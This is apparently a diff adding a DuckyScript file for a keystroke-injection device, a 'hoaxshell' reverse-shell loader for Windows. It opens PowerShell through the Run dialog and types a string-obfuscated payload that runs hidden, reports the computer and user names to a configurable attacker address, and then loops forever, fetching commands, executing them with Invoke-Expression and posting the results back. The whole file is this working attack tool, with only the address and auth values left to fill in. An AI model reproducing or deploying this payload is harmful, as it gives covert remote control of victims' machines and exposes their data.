@@ -1,0 +1,31 @@
+REM Title: Simple hoaxshell loader
+REM Author: bytequill
+REM Description: A simple hoaxshell reverse shell loader for windows.
+REM Target: Windows powershell
+ATTACKMODE HID
+REM format: IP:port   eg. 0.0.0.0:1337 192.168.1.1:8080
+DEFINE #ADDR 
+REM Hoaxshell auth: 000000-111111-222222
+DEFINE #AUTH0 
+DEFINE #AUTH1 
+DEFINE #AUTH2 
+DEFINE #PROTOCOL http://
+
+DELAY 1000
+GUI r
+DELAY 200
+STRINGLN powershell
+DELAY 600
+
+REM Slightly obfuscated payload
+STRING_POWERSHELL
+Start-Process $PSHOME\powershell.exe 
+-ArgumentList {
+$addr='#ADDR';
+$auth='#AUTH0-#AUTH1-#AUTH2';
+$protocol='#PROTOCOL';
+$ConfirmPreference="None";In""vo""ke-Re''stM''ethod -UseBasicParsing -Uri $protocol$addr/#AUTH0/$env:COMPUTERNAME/$env:USERNAME -Headers @{"Authorization"=$auth};for (;;){$g=(Inv''oke-""RestMet""hod -UseBasicParsing -Uri $protocol$addr/#AUTH1 -Headers @{"Authorization"=$auth});if ($g -ne 'None') {$l=I''nv""oke-Expr""essio''n $g -ErrorAction Stop -ErrorVariable e;$l=Out-Str''ing -InputObject $l;I''nvo""ke''-Re""stM''ethod -Uri $protocol$addr/#AUTH2 -Method POST -Headers @{"Authorization"=$auth} -Body ([System.Text.Encoding]::UTF8.GetBytes($h+$l) -join ' ')} S""tar''t-Slee''p 1.0}} 
+-WindowStyle Hidden;exit
+END_STRING
+ENTER
+ATTACKMODE OFF
